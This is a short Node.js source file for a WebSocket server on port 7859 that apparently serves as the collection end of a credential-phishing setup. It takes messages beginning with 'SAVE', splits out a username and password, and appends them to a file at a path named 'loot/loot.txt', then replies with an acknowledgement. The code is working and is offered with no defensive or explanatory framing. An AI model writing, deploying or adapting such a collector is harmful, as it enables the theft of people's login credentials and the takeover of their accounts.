const WebSock = require('ws');
const Server = new WebSock.Server({port: '7859'});
const fs = require('fs');

Server.on('connection',sock=>{
    //console.log(sock);
    sock.on('message',(message)=>{
        const msg = `${message}`;
        if(msg.startsWith("SAVE")){
            let splitMessageUsr = msg.split("|")[0];
            let splitMessagePsd = msg.split("|")[1];
            let username = splitMessageUsr.split("-")[1];
            let password = splitMessagePsd.split("_")[1];
            fs.appendFileSync("/var/www/node-stuff/loot/loot.txt",`\nUSERNAME:${username}\nPASSWORD:${password}\n`);
            sock.send("GTTS");
        }
    })
})
